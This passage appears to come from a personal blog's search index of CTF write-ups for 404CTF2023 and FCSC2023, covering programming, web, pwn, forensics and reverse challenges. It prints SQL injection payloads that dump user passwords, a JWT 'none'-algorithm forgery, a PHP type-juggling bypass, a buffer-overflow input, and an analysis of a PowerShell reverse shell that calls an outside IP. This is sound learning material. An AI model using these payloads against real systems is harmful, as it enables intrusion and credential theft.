much time. When it happens, we know it’s done so we break out of the loop.We receive until the character ‘}’ (the end of the flag) and print the response.We have the flag !I hope this writeup was easy to understand. Have a good day 😀 !" }, { "title": "CTFs | 404CTF2023 | Programmation | Des mots, des mots, des mots", "url": "/CTFs/404CTF2023/programmation/des_mots_des_mots_des_mots", "categories": "CTFs, 404CTF2023, Programmation", "tags": "CTFs, 404CTF2023, Programmation", "date": "2023-06-06 00:00:00 +0200", "snippet": "ContextLet’s connect to the challenge to know more.It seems like there will be different rules.No need to implement anything for this one.I implemented a function to send datas and receive the response.def send_receive(r, msg): r.send(msg) print(r.recvuntil('&gt;&gt; ').decode())Here r is the connection made with the pwn library.My code for Rule 0 is the following:import pwnfrom functions import *if __name__ == '__main__': r = pwn.remote('challenges.404ctf.fr', 30980) response = r.recvuntil(b'&gt;&gt; ').decode() print(response) send_receive(r, 'cosette')We just send ‘cosette’.functions is a python file where I put my functions.Here is the output of the code:First RuleFor the Rule 1, we need to invert the letters in the input.Example:if the input is ‘cosette’, the output of the Rule 1 is ‘ettesoc’.Here is my implementation of the Rule 1:def rule_1(msg, original): return msg[::-1], originalI completed the main code to send it to the server.msg1, original = rule_1('cosette', 'cosette')print(msg1)send_receive(r, msg1)I add the original message to the parameter of the function and return it because we will need it for the 3rd Rule.Output of the Rule 1:Second RuleAlright, it gets harder.If the number of letters in the input is even, we have to invert the first and the second part of the word.Example:‘boat’ has an even number of letters. We exchange the first and the second part of the word: ‘bo’, ‘at’ -&gt; ‘atbo’.If the number of letters in the input is odd, we delete the letters corresponding to the central letter.Example:‘cosette’ has an odd number of letters.‘e’ is the central letter (‘cos’, ‘e’, ‘tte’).We delete every ‘e’ in the word ‘cosette’.It gives us ‘costt’.Here is my implementation of the second Rule:def is_nb_lettres_pair(msg): return len(msg) % 2 == 0def rule_2(message): msg = message[0] original = message[1] if is_nb_lettres_pair(msg): part1 = msg[:len(msg) // 2] part2 = msg[len(msg) // 2:] return part2 + part1, original else: mid = msg[len(msg) // 2] return msg.replace(mid, ''), originalI added this to the main code:msg2, original = rule_2(rule_1('cosette', 'cosette'))print(msg2)send_receive(r, msg2)Output of the second Rule:Third RuleIf the word contains less than 3 letters, we return the word without modification.Else:We use the original word (that was inputed in the first rule initially).If the third letter of the word is a consonant, we shift the vowel to the left. Then we apply the rule 1 and the rule 2.Example:‘poteau’. The third letter is ‘t’, a consonant. So we shift the vowel on the left.The vowel in ‘poteau’ are ‘o’, ‘e’, ‘a’, ‘u’. We shift them on the left, like a loop: ‘e’, ‘a’, ‘u’, ‘o’.We insert the vowel back in the word: ‘petauo’We apply the first rule: ‘petauo’ -&gt; ‘ouatep’.We apply the second rule: ‘ouatep’ -&gt; ‘tepoua’If the third letter of the word is a vowel, we do the same process except that we shift the vowel on the right instead of left.Example:shift on the right: ‘drapeau’ -&gt; ‘drupaea’Then Rule 1: ‘drupaea’ -&gt; ‘aeapurd’Then Rule 2: ‘aeapurd’ -&gt; ‘aeaurd’I struggled a lot with 3rd rule because I did not understand at first that we needed to apply the changes on the original word if the word contains 3 letters or more.Here is my implementation of the Third Rule:voyelle = {'a', 'e', 'i', 'o', 'u', 'y'}alphabet = 'abcdefghijklmnopqrstuvwxyz'def is_voyelle(letter): return letter.lower() in voyelledef is_consonne(letter): return letter.lower() not in voyelle and letter.lower() in alphabetdef get_list_voyelles(msg): list_voyelle = [] for index, letter in enumerate(msg): if letter in voyelle: list_voyelle.append(index) return list_voyelledef rotate_gauche(msg, list_voyelles): tmp = msg[list_voyelles[0]] for i in range(1, len(list_voyelles)): msg[list_voyelles[i - 1]] = msg[list_voyelles[i]] msg[list_voyelles[-1]] = tmp return msgdef rotate_right(msg, list_voyelles): tmp = msg[list_voyelles[-1]] for i in range(len(list_voyelles) - 1, 0, -1): msg[list_voyelles[i]] = msg[list_voyelles[i - 1]] msg[list_voyelles[0]] = tmp return msgdef rule_3(message): msg = message[0] original = message[1] msg = list(msg) if len(msg) &lt; 3: return msg, original mot_original = \"\" for c in original: mot_original += c mot_original = list(mot_original) list_voyelles = get_list_voyelles(mot_original) if is_consonne(msg[2]): rotate_gauche(mot_original, list_voyelles) else: rotate_right(mot_original, list_voyelles) mot_original = ''.join(mot_original) msg1 = rule_1(mot_original, original) msg2 = rule_2(msg1) return msg2I send it to the server:msg3, original = rule_3(rule_2(rule_1('cosette', 'cosette')))print(msg3)send_receive(r, msg3)Output of the third rule:Fourth RuleThe 4th rule is very complex to understand but not really harder than the third one.Here is my implementation (we use the same alphabet and voyelles variables. We use the same functions is_consonne and is_voyelle functions):from collections import Counterdef find_last_voyelle(code): while 1: if chr(code).lower() in voyelle: return code code -= 1def get_sum(mot, count): s = 0 for i in range(count - 1, -1, -1): if mot[i].lower() in voyelle: s += ord(mot[i]) * (2 ** (count - i)) return sdef insert_letter(mot, count): vp = find_last_voyelle(ord(mot[count])) # Previous vowel #s = get_sum(mot, count) s = sum([ord(mot[i]) * (2 ** (count - i)) * (int(is_voyelle(mot[i]))) for i in range(count - 1, -1, -1)]) a = ((vp + s) % 95) + 32 mot.insert(count + 1, chr(a))def evaluate_and_insert(mot, count): if is_consonne(mot[count]): insert_letter(mot, count)def insert_characters(word, original): mot = list(word) count = 0 while count &lt; len(mot): evaluate_and_insert(mot, count) count += 1 return ''.join(mot)def sort_word(word): # Count character occurrences char_counts = Counter(word) #print(char_counts) # Sort characters by occurrences (descending) and ASCII codes (ascending) sorted_chars = sorted(char_counts.keys(), key=lambda c: (-char_counts[c], ord(c))) # get the right number of occurences for each character sorted_chars = [c for c in sorted_chars for _ in range(char_counts[c])] # Build the sorted word sorted_word = ''.join(sorted_chars) return sorted_worddef rule_4(message): msg = message[0] original = message[1] result = insert_characters(msg, original) return sort_word(result)In the insert_characters function, we iterate over the letters of the word. We insert a new character if the letter is a consonant.To insert a word, we need to perform several operations.First we need to find the ascii code of the last vowel in the alphabet preceding our letter. We name this variable ‘vp’.ThenExample: If our letter is ‘s’, the last voyelle is ‘o’ so we return the ascii code of ‘o’.I get the ascii code of the last vowel with the find_last_voyelle function.Then if the letter is a vowel, I calculate this sum:s = SOMME{i=n-1 -&gt; 0}(a{i}2^(n-i)Id(l{i} est une voyelle))For each letter before the current one, we calculate a{i}*2^(n-i) with a{i} the ascii code of the letter at index i.The ascii code of the new letter is obtained with this operation:a = ((vp + s) % 95) + 32We insert the new character in our word.In the sort_word function, we sort the letters in the word obtained from the insert_characters function. (number of occurences of a letter in descending order and ASCII code in ascending order in case of draw).I defined a rules function to apply all rules:def rules(msg, original): msg = rule_4(rule_3(rule_2(rule_1(msg, original)))) return msgI added the code to the main:msg4 = rules('cosette', 'cosette')print(msg4)r.sendline(bytes(msg4, 'utf-8'))response = r.recvuntil(b'&gt;&gt;').decode()print(response)I did not use the send_receive function because i need the output for the last challenge.Here is the output of the Fourth Rule:Last ChallengeWe are given a text, we need to translate each word using the rules implemented.Here is my implementation to do it:import re response = re.findall(r'\\{.*\\}', response)[0] response = response.strip('}').strip('{') resp = response.split(' ') resp = [rules(word, word) for word in resp] resp = ' '.join(resp) r.sendline(bytes(resp, 'utf-8')) response = r.recvuntil(b'}').decode() print(response)I extract the text from the response.For each word, I apply the rules function to translate the word.Then I join every word of my list of words with spaces and send it to the server.Here the output:We’ve got the flag !!!" }, { "title": "CTFs | 404CTF2023 | Web | Le Loup et le renard", "url": "/CTFs/404CTF2023/web/le_loup_et_le_renard", "categories": "CTFs, 404CTF2023, Web", "tags": "CTFs, 404CTF2023, Web, Intro", "date": "2023-06-05 00:00:00 +0200", "snippet": "ContextThis challenge is made of 3 parts. Here is the first one:Le texte nous indique que l’authentification est géré en front-end (côté client). En regardant le code source de la page, on peut observer le mécanisme d’authentication:On obtient le username “admin” et le mot de passe “h5cf8gf2s5q7d”.On est redirigé vers la 2ème partie du challenge:Le texte mentionne les cookies et le fait que l’authentification est faite en front-end.Parmi les cookies se trouve un cookie isAdmin:On change la valeur du cookie isAdmin à true et on recharge la page.On est redirigé vers la 3ème partie du challenge:En voyant le titre Redirect, j’ai pensé que la vulnérabilité était du type Execute After Redirect (EAR)I intercepted the response with burpsuite.The page is executed then we get redirected so we are able to read sensitive content.I hope you understood this writeup 😊" }, { "title": "CTFs | 404CTF2023 | Web | La Vie Française", "url": "/CTFs/404CTF2023/web/la_vie_francaise", "categories": "CTFs, 404CTF2023, Web", "tags": "CTFs, 404CTF2023, Web, Sqli", "date": "2023-06-05 00:00:00 +0200", "snippet": "ContextBy clicking the link, we end on the journal’s website:Let’s try to postulate:It’s a register page. We register with a random username, “bipboup”.We are redirected to a login page:After connecting, we are on our account page:We have got a cookie named “uuid” which identify us on the website.I could not decrypt the cookie. I thought that maybe the cookie is stored in the database and the username is retrieved with an sql query that could look like.select username from users where uuid = &lt;uuid&gt;;Maybe the way the sql query is made is vulnerable to sql injections.So I tried this:I added “’ or 1=1– -“ after the my cookie to try to select the first row.It worked, I’m connected as Jacques Rival.I created a script to craft my requests:import requestsfrom bs4 import BeautifulSoupurl = \"https://la-vie-francaise.challenges.404ctf.fr/account\"sep = \"0x207c20\"payload = f\"\"cookies = {'uuid': payload}r = requests.get(url, cookies=cookies).textr = r.replace(\",\", \"\\n\")if \"Connexion\" in r: print(\"Courage, tu y es presque !\")else: soup = BeautifulSoup(r, 'html.parser') print(soup.find(\"h3\").text) print(\"Bravo !\")We just have to replace the payload with our payload.I tried a union based sqli. I tried a request like:' UNION SELECT 1-- -I increased the number of row until I reach the good number of row of the query.with:' UNION SELECT 1, 2, 3-- -I get this output:Ok so we need 3 arguments and the first one is displayed on the screen.Let’s try to get the version of the database:' UNION SELECT version(), 2, 3-- -The engine is a MariaDB.Let’s get the tables under this database(There are more like system tables and other ones could be created).' UNION SELECT group_concat(table_name), 2, 3 from information_schema.tables where table_schema=database()-- -There is a table user. We need to know the columns of the table:' UNION SELECT group_concat(column_name), 2, 3 from information_schema.columns where table_name='users'-- -Now we can dump the table:' UNION SELECT group_concat(uuid, {sep} , username, {sep}, password), 2, 3 from users-- -We have madelaineforestier’s password and uuid. We can connect using both.Let’s use the uuid:On the admin panel:We’ve got the flag 🥳 !!I hope you learned something through this writeup 😉Oh wait, I almost forgot to flex !" }, { "title": "CTFs | 404CTF2023 | Web | L'Academie du détail", "url": "/CTFs/404CTF2023/web/l_academie_du_detail", "categories": "CTFs, 404CTF2023, Web", "tags": "CTFs, 404CTF2023, Web, JWT", "date": "2023-06-05 00:00:00 +0200", "snippet": "ContextHere is the website main page:There are 4 endpoints: /login -&gt; we can connect as whoever we want as long as it’s not admin /logout -&gt; to disconnect /home -&gt; just the home page /membres to see the members of the academy.By going to the endpoint /membres we get this page:After trying to SQLI the login form, I noticed that we have a JWT token as auth cookie:By using Cyberchef, we can decode it (we can also jwt.io or just base64 decode each part):I tried to change the value of username by “admin” and change the algorithm used for the key by “None”. If the site does not verify that the good algorithm is used, it could validate the token.I change the value of the “access-token” cookie by the new value and access the /membres endpoint.Here we go 😃 !I hope you understood the process. If you want to know more, dig about JWT token vulnerabilities." }, { "title": "CTFs | FCSC2023 | Web | Enisa Flag Store 1", "url": "/CTFs/FCSC2023/web/enisa_flag_store_1", "categories": "CTFs, FCSC2023, Web", "tags": "CTFs, FCSC2023, Web, Sqli", "date": "2023-05-06 00:00:00 +0200", "snippet": "ContextI did not solved this challenge during the CTF, but I solved it after.We are given the source code of the websiteIt’s a pretty simple website, we can register, login, logout, and see the flag of our team.To register, we need to provide a username, a password, a token and a team name. The form request looks like this:I provided the token given in the challenge description.When I connect, I’m given an auth cookie and end up on the main page.And can show the flag of my team.First I thought I had to crack the auth cookie, but it was a dead end.Then looking at the source code, I noticed that all the queries were prepared except one:This query is in the getData function, which is called when we want to see the flag of our team.Since the query is not prepared, we can perform a SQL injection.When we register, we can provide a team name, which is not sanitized. So, I registered with the following team name:username=sqli&amp;password=sqli&amp;token=ohnah7bairahPh5oon7naqu1caib8euh&amp;country=fr'+or+1%3d1--+-The country is: fr’ or 1=1– -So, when we want to see the flag of our team, the query will be:SELECT ctf, challenge, flag, points FROM flags WHERE country = 'fr' or 1=1-- -It will display all the flags.We’ve got the flag !It’s a simple sqli but I struggled to do it during the CTF, I was stuck on the auth cookie. Besides the code is 600 lines long and it’s easy to miss something.I hope you enjoyed this writeup, see you next time !" }, { "title": "CTFs | FCSC2023 | Web | Salty Authentication", "url": "/CTFs/FCSC2023/web/salty_authentication", "categories": "CTFs, FCSC2023, Web", "tags": "CTFs, FCSC2023, Web, Magic Hash, Type Juggling", "date": "2023-05-05 00:00:00 +0200", "snippet": "ContextI did not solved this challenge during the CTF, but I solved it after.Here is the main page:We are presented the php code of the page:&lt;?phperror_reporting(0);include('flag.php');$salt = bin2hex(random_bytes(12));extract($_GET);$secret = gethostname() . $salt;if (isset($password) &amp;&amp; strlen($password) === strlen($secret) &amp;&amp; $password !== $secret) { if (hash('fnv164', $password) == hash('fnv164', $secret)) { exit(htmlentities($flag)); } else { echo('Wrong password!'); exit($log_attack()); }}highlight_file(__FILE__);?&gt;The flag is included from flag.php.The flagif (hash('fnv164', $password) == hash('fnv164', $secret)) { exit(htmlentities($flag)); }To reveal the flag, we need to have the hash of the secret equal to the hash of the password.We can define some variables in the url thanks to the extract($_GET). So, we can define the $password variable.First we have to pass this test:if (isset($password) &amp;&amp; strlen($password) === strlen($secret) &amp;&amp; $password !== $secret)We can see that $password has to be set. It has to be the same length as $secret. And it has to be different from $secret.As $password has to be different from $secret, we cannot use the same string for both. So, we have to find a hash collision (different values, same hash).$secret is the concatenation of the hostname and the salt which is a random string of 12 bytes.Hostname lengthThe first thing that came to my mind is to use extract($_GET) to rewrite the $salt variable. Unfortunately, we cannot rewrite the $secret variable as it is defined after the extract.With this, we can pass the first test by finding the length of the hostname.To do this, we rewrite the $salt variable as an empty string. Then, we add a character to the $password variable until we get the “Wrong password!” message.import requestsimport timepassword = \"\"salt=\"\"counter = 0while 1: counter += 1 password += \"1\" print(counter) url = f\"https://salty-authentication.france-cybersecurity-challenge.fr/?salt=&amp;password={password}\" r = requests.get(url) if \"Wrong password!\" in r.text: print(f\"Hostname length: {counter}\") break time.sleep(5)Output:The hostname length is 12.HostnameNow we need to find the hostname. What we can notice is this:else { echo('Wrong password!'); exit($log_attack());}If the hashes are different, we get the “Wrong password!” message. And the $log_attack() function is called.As log_attack is a variable, we can rewrite it with extract($_GET). So, we can define the $log_attack() function called when the hashes are different.Let’s call phpinfo to get the hostname:url: https://salty-authentication.france-cybersecurity-challenge.fr/?salt=&amp;password=123456789012&amp;log_attack=phpinfoOutput:We’ve got the hostname: 9be4a60f645fType jugglingThe == operator is used to compare the hashes. It’s a weak comparison. It’s a type juggling comparison.With this operator, if a comparaison is made between a string and an integer, the string is converted to an integer.So, if the string begins with “0e”, it will be converted to 0. It’s a magic hash!type juggling articlemagic hashes articleMagic hashLet’s try to find a magic hash for the secret. The secret has to begin with the hostname then we can use the salt to change the value.Code to find a magic hash:&lt;?php$counter =0;while(1){ $salt = bin2hex(random_bytes(6)); $secret = \"9be4a60f645f\" . $salt; $counter+=1; $hash = hash('fnv164',$secret); if ($hash==0) { echo (\"secret: \".$secret.\"\\n\"); echo (\"salt: \".$salt.\"\\n\"); echo (\"hash result: \".$hash.\"\\n\"); echo (\"iteration number: \".$counter.\"\\n\"); exit(); }}?&gt;Output:Now let’s find a magic hash for the password with the same length:&lt;?php$counter =0;while(1){ $password = bin2hex(random_bytes(12)); $counter+=1; $hash = hash('fnv164',$password); if ($hash==0) { echo (\"password: \".$password.\"\\n\"); echo (\"hash result: \".$hash.\"\\n\"); echo (\"iteration number: \".$counter.\"\\n\"); exit(); }}?&gt;Output:Ok so if put salt=”70f9186fa35c” and password=”8215d358c2d73169d5895016”, the secret and the password will have the same length while having different values so we can pass the first test.As both hashes begins with “0e”, they will be converted to 0. So, the hashes will be equal and we will get the flag.curl \"https://salty-authentication.france-cybersecurity-challenge.fr/?salt=70f9186fa35c&amp;password=8215d358c2d73169d5895016\"We get the flag!" }, { "title": "CTFs | FCSC2023 | Intro | Spanosaurus", "url": "/CTFs/FCSC2023/intro/spanosaurus", "categories": "CTFs, FCSC2023, Intro", "tags": "CTFs, FCSC2023, Intro, Side Channel", "date": "2023-05-01 00:00:00 +0200", "snippet": "ContextLa société MegaSecure vient d’éditer une mise à jour de sécurité pour leurs serveurs. Après analyse de la mise à jour, vous vous apercevez que l’éditeur utilise maintenant ce code pour l’exponentiation :unsigned long exp_by_squaring(unsigned long x, unsigned long n) { // n est l'exposant secret if (n == 0) { return 1; } else if (n % 2 == 0) { return exp_by_squaring(x * x, n / 2); } else { return x * exp_by_squaring(x * x, (n - 1) / 2); }}Vous avez accès à un serveur où vous avez pu lancer en tant qu’utilisateur exp_by_squaring(2, 2727955623) tout en mesurant sa consommation d’énergie. L’exposant ici est donc n = 2727955623, soit 10100010100110010100110010100111 en binaire. Cette trace de consommation est sauvegardée dans trace_utilisateur.csv.Vous avez également réussi à mesurer la consommation d’énergie pendant l’exponentiation d’une donnée de l’administrateur. Cette trace de consommation est sauvegardée dans trace_admin.csv. Saurez-vous retrouver son exposant secret n ?Le flag est au format FCSC{1234567890} avec 1234567890 à remplacer par l’exposant secret de l’administrateur écrit en décimal.We are given: the user trace (trace_utilisateur.csv) the admin trace (trace_admin.csv) the above image with the user trace above and the admin trace belowLet’s take a look at the code:unsigned long exp_by_squaring(unsigned long x, unsigned long n) { // n est l'exposant secret if (n == 0) { return 1; } else if (n % 2 == 0) { return exp_by_squaring(x * x, n / 2); } else { return x * exp_by_squaring(x * x, (n - 1) / 2); }}It will have 2 stages. First going decreasing n through recursive descent. Then when n == 0, we go back through backtracking to get the result.We can see the phases on the image given. The first one is always the same patern. The second one is different.We know that a multiplication consumes a lot of power. So, whenever we see a big peek in power consumption, it’s because a multiplication has been made.Another interesting thing:With each recursion, we divide n by 2 so we handle on bit in the binary representation since binary is base 2.Example:13 in decimal is 1101 in binary.at first recurence, n is odd so n becomes (n-1) / 2 = (12 - 1) / 2 = 66 in decimal is 110 in binary so we handled the bit on the right.6 is even so it become n / 2 = 6 / 2 = 33 in decimal is 11 in binary so we handled the bit on the right.and so on..There will be as many recursion as there is number of digits in the input in binary representation.So there will be 32 recursions.First stage:The first stage is the recursive descent.In this stage, no matter if n is odd or even, we will do one multiplication:// if n is evenexp_by_squaring(x * x, n / 2)// if n is oddexp_by_squaring(x * x, (n-1) / 2)That’s why we see 32 peeks in the first stage. One peek per multiplication, 1 multiplication per recursion, 32 recursions.We are handling bits from right to left.Second stage:This stage is the backtracking of the recursion.In this stage, if n is even there is no multiplication. If n is odd, there is a multiplication. So we only have a peek if n is odd (1).// exp_by_squaring(...) has been calculated during the recursive descent.// if n is even, no multiplicationexp_by_squaring(x * x, (n - 1) / 2)// if n is odd, one multiplicationx * exp_by_squaring(x * x, (n - 1) / 2)Since it is backtracking, we handle the digits in reverse order from the first stage (from left to right).If we take a look at the user trace, it begins with a peek so the first digit is 1. Then there is a little peek so it’s 0. Then there is a big peek so it’s 1 and so one.The binary representation of the user number is 10100010100110010100110010100111. It begins with 101 (left to right) as expected.Now that we know how find the n from the trace, we can find the admin number 😏.admin number:10001010101110001110011110101101We’ve got the flag: FCSC{10001010101110001110011110101101}I hope you enjoyed this explaination and that it could be useful in the future 😊." }, { "title": "CTFs | FCSC2023 | Intro | Rot13", "url": "/CTFs/FCSC2023/intro/rot13", "categories": "CTFs, FCSC2023, Intro", "tags": "CTFs, FCSC2023, Intro, Obfuscation", "date": "2023-05-01 00:00:00 +0200", "snippet": "ContextWe have a text that is encoded with rot13. We can use CyberChef to decode it:We’ve got the flag: FCSC{ed24c7fd86c2f0515366}This challenge was very easy, but it was a good warm-up for the next ones. It’s an introduction to encoding/decoding." }, { "title": "CTFs | FCSC2023 | Intro | La gazette de Windows", "url": "/CTFs/FCSC2023/intro/la_gazette_de_windows", "categories": "CTFs, FCSC2023, Intro", "tags": "CTFs, FCSC2023, Intro, Forensic", "date": "2023-05-01 00:00:00 +0200", "snippet": "ContextWe are given a windows log file (Microsoft-Windows-PowerShell4Operational.evtx)Let’s open it in the Event Viewer:We have only 9 logs, it will make things easier.In the first log, the user checks if the variable $global exists.In the second log, the user executes whoami. He is checking is permissions:In the third log, the user execute “C:\\Users\\jmichel\\Downloads\\payload.ps1” which contains “{0}”. He is just testing.In the fourth log, the user execute “C:\\Users\\jmichel\\Downloads\\payload.ps1” which contains a more complicated code.Within the function, it first creates a buffer of bytes using an array range operator (0..$TCPClient.ReceiveBufferSize). The value of each element in the array is set to zero using the percentage (%) symbol and the script scope variable “$script:Buffer”.Then, the function writes the provided string plus the string “SHELL&gt;” to a stream writer object called “$StreamWriter”, and flushes the writer to ensure that any buffered data is sent immediately.Note that this function relies on the existence of a TCPClient object, which is not defined in the code.Here is the code executed in the fifth log:This PowerShell script does the following: It continuously attempts to create a TCP connection to an IP address “10.255.255.16” on port 1337 until it succeeds. Once a connection is established, it creates a StreamWriter object to write data to the TCP network stream. It defines a function named WriteToStream, which writes a string to the StreamWriter object with the prefix “SHELL&gt; “. It creates an array of bytes named “l” and populates it with values. It performs an XOR operation on each byte of the “l” array with the corresponding value of the loop variable “i” to obtain another array of bytes “s”. It calls the WriteToStream function with the “s” string as a parameter to send the decoded command to the TCP network stream. It reads input from the TCP network stream, executes the input as a PowerShell command using Invoke-Expression, captures the output, and sends the output to the TCP network stream using the WriteToStream function. It is RCE (Remote Code Execution) with the variable “s” being the command.We will attempt to find what the command is.Since this is just a XOR, I will execute the code:$l = 0x46, 0x42, 0x51, 0x40, 0x7F, 0x3C, 0x3E, 0x64, 0x31, 0x31, 0x6E, 0x32, 0x34, 0x68, 0x3B, 0x6E, 0x25, 0x25, 0x24, 0x77, 0x77, 0x73, 0x20, 0x75, 0x29, 0x7C, 0x7B, 0x2D, 0x79, 0x29, 0x29, 0x29, 0x10, 0x13, 0x1B, 0x14, 0x16, 0x40, 0x47, 0x16, 0x4B, 0x4C, 0x13, 0x4A, 0x48, 0x1A, 0x1C, 0x19, 0x2, 0x5, 0x4, 0x7, 0x2, 0x5, 0x2, 0x0, 0xD, 0xA, 0x59, 0xF, 0x5A, 0xA, 0x7, 0x5D, 0x73, 0x20, 0x20, 0x27, 0x77, 0x38, 0x4B, 0x4D;$s = \"\";for ($i = 0; $i -lt 72; $i++) { $s += [char]([int]$l[$i] -bxor $i) }echo $sThe result is the flag 😋By curiosity, let’s take a look at the other logs.In the sixth log, the user run change the execution policy to bypass so that he can execute his script. Then he execute the script.The seventh log has the EventID 40962 which is PowerShell console is ready for user input.The eighth log is the user inputs:The final log has event id 40961 which is PowerShell console is starting up. The script is running." }, { "title": "CTFs | FCSC2023 | Intro | Dystalosaurus", "url": "/CTFs/FCSC2023/intro/dystalosaurus", "categories": "CTFs, FCSC2023, Intro", "tags": "CTFs, FCSC2023, Intro, Hardware", "date": "2023-05-01 00:00:00 +0200", "snippet": "ContextWe are given the capture made with Salae Logic 2 (dystalosaurus.sal)We install Salae Logic 2 and open the capture:By zooming it gives something like this.It seems to be only one signal, no clock.By searching on the internet, Salae Logic 2 has analyzers to read the signal. Since there is no clock, I create an Async Serial analyzer like this:It looks like the analyzer found text:I export to TXT/CSVHere is the result:With a python script, we reconstruct the text:salae-csv2txtWe filter to get the flag 🙂:" }, { "title": "CTFs | FCSC2023 | Intro | Aaarg", "url": "/CTFs/FCSC2023/intro/aaarg", "categories": "CTFs, FCSC2023, Intro", "tags": "CTFs, FCSC2023, Intro, Reverse", "date": "2023-05-01 00:00:00 +0200", "snippet": "ContextWe are given an executable “aaarg”.Using ghidra, I spoted this:It seems to be the flag.I opened the executable in radare2 to have a better view of the flag.Then I used cyberchef regex and find/replace to assemble the flag:Here is the flag 🥳" }, { "title": "CTFs | FCSC2023 | Misc | Zero Pointé", "url": "/CTFs/FCSC2023/misc/zero_pointe", "categories": "CTFs, FCSC2023, Misc", "tags": "CTFs, FCSC2023, Misc, IOF", "date": "2023-04-30 00:00:00 +0200", "snippet": "ContextWe are given: an executable (zero_pointe) the source code of the executable (zero_pointe.c)Let’s take a look at the source code:#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;static voidflag(int sig){ (void) sig; char flag[128]; int fd = open(\"flag.txt\", O_RDONLY); if (fd == -1) { perror(\"open\"); exit(EXIT_FAILURE); } int n = read(fd, flag, sizeof(flag)); if (n == -1) { perror(\"read\"); exit(EXIT_FAILURE); } flag[n] = 0; flag[strstr(flag, \"\\n\") - flag] = 0; if (close(fd) == -1) { perror(\"close\"); exit(EXIT_FAILURE); } printf(\"%s\\n\", flag); exit(EXIT_SUCCESS);}longread_long(){ long val; scanf(\"%ld\", &amp;val); return val;}intmain(){ long a; long b; long c; if (signal(SIGFPE, flag) == SIG_ERR) { perror(\"signal\"); exit(EXIT_FAILURE); } a = read_long(); b = read_long(); c = b ? a / b : 0; printf(\"%ld\\n\", c); exit(EXIT_SUCCESS);}The code defines 3 long (a, b, c). Then it creates a signal handler that calls the function flag if a SIGFPE signal is received.Then it asks the user to enter 2 numbers for a and b. If b == 0 then c = 0 else c = a / b.Our goal is to trigger a SIGFPE signal to retrieve the flag.By looking on internet, this signal covers all arithmetic errors, including division by zero and overflow.We can’t divide by 0 because the program checks if b is equal to 0.We can try an overflow.An overflow happens if the result of an operation is too big to be stored in the memory allocated for it.In our case, we can try to make a / b overflow.The maximum value of a long is LONG_MAX = 9223372036854775807.The minimum value of a long is LONG_MIN = -9223372036854775808.We can try to make a = LONG_MIN and b = -1.Then c = LONG_MIN / -1 = LONG_MAX + 1. This would result in an overflow as LONG_MAX + 1 is too big to be stored in a long.Let’s try it:Let’s try our exploit on the remote server:We have the flag 🎊 !" }, { "title": "CTFs | FCSC2023 | Intro | uid", "url": "/CTFs/FCSC2023/intro/uid", "categories": "CTFs, FCSC2023, Intro", "tags": "CTFs, FCSC2023, Pwn, BOF", "date": "2023-04-30 00:00:00 +0200", "snippet": "ContextI analyzed the file with Ghidra:The code is pretty simple: It puts the value of geteuid() in a variable that I called uid. It asks the user to enter a username. If the value of uid is 0 then it prints the flag.It seems to be a buffer overflow.I used gdb to solve this challenge.Here is the code of the main function in gdb:We can see that the value of uid is stored at rbp-0x4 and the value entered is stored at rbp-0x30 (-48 in decimal).The idea is to fill the buffer of 44 characters then to add 0s to overwrite the value of uid.Let’s define a hook-stop and a breakpoint before the CMP to facilitate the investigation:Let’s run the program to see how it presents:r &lt;&lt;&lt; $(python -c 'print(\"A\"*44)')Here we filled the buffer with 44 “A”s.We can see that the value of uid is just after the buffer. (0x00000300)Now we had our 0s to overwrite the value of uid:r &lt;&lt;&lt; $(python -c 'print(\"A\"*44 + \"\\x00\"*4)')Nice we have overwritten the value. Let’s continue.We get the flag in local !!Now we can try to get the flag on the server with this payload.We have succeded !!" }, { "title": "CTFs | FCSC2023 | Intro | Tri selectif", "url": "/CTFs/FCSC2023/intro/tri_selectif", "categories": "CTFs, FCSC2023, Intro", "tags": "CTFs, FCSC2023, Intro, Programmation", "date": "2023-04-30 00:00:00 +0200", "snippet": "ContextWe are given the source code of the application and a base code to connect to the application and interact:App:import osdef usage():\tprint('Actions possibles:')\tprint(' - \"comparer X Y\": compare les valeurs du tableau aux cases X et Y, et retourne 1 si la valeur en X est inférieure ou égale à celle en Y, 0 sinon.')\tprint(' - \"echanger X Y\": échange les valeurs du tableau aux cases X et Y, et affiche le taleau modifié.')\tprint(' - \"longueur: retourne la longueur du tableau.')\tprint(' - \"verifier: retourne le flag si le tableau est trié.')def printArray(A):\tprint(\" \".join(\"*\" for a in A))def verifier(A):\treturn all([ A[i] &lt;= A[i + 1] for i in range(len(A) - 1) ])if __name__ == \"__main__\":\tA = list(os.urandom(32))\tprint(\"Votre but est de trier un tableau dont vous ne voyez pas les valeurs (chacune est remplacée par *) :\")\tprintArray(A)\tusage()\tB = A[:]\ttry:\t\twhile True:\t\t\tx = input(\"&gt;&gt;&gt; \")\t\t\tif x.startswith(\"comparer\"):\t\t\t\tx, y = list(map(int, x.split(\" \")[1:]))\t\t\t\tprint(int(A[x] &lt;= A[y]))\t\t\t\t\t\telif x.startswith(\"echanger\"):\t\t\t\tx, y = list(map(int, x.split(\" \")[1:]))\t\t\t\tA[x], A[y] = A[y], A[x]\t\t\telif x.startswith(\"longueur\"):\t\t\t\tprint(len(A))\t\t\telif x.startswith(\"verifier\"):\t\t\t\tc = verifier(A)\t\t\t\tif c:\t\t\t\t\tflag = open(\"flag.txt\").read().strip()\t\t\t\t\tprint(f\"Le flag est : {flag}\")\t\t\t\telse:\t\t\t\t\tprint(\"Erreur : le tableau n'est pas trié\")\t\t\t\t\tprint(f\"Le tableau de départ était : {B}\")\t\t\t\t\tprint(f\"Le tableau final est : {A}\")\t\t\t\tprint(\"Bye bye!\")\t\t\t\tbreak\t\t\telse:\t\t\t\tusage()\texcept:\t\tprint(\"Erreur : vérifier les commandes envoyées.\")Client:#!/usr/bin/env python3# python3 -m pip install pwntoolsfrom pwn import *# Paramètres de connexionHOST, PORT = \"challenges.france-cybersecurity-challenge.fr\", 2051def comparer(x, y):\tio.sendlineafter(b\"&gt;&gt;&gt; \", f\"comparer {x} {y}\".encode())\treturn int(io.recvline().strip().decode())def echanger(x, y):\tio.sendlineafter(b\"&gt;&gt;&gt; \", f\"echanger {x} {y}\".encode())def longueur():\tio.sendlineafter(b\"&gt;&gt;&gt; \", b\"longueur\")\treturn int(io.recvline().strip().decode())def verifier():\tio.sendlineafter(b\"&gt;&gt;&gt; \", b\"verifier\")\tr = 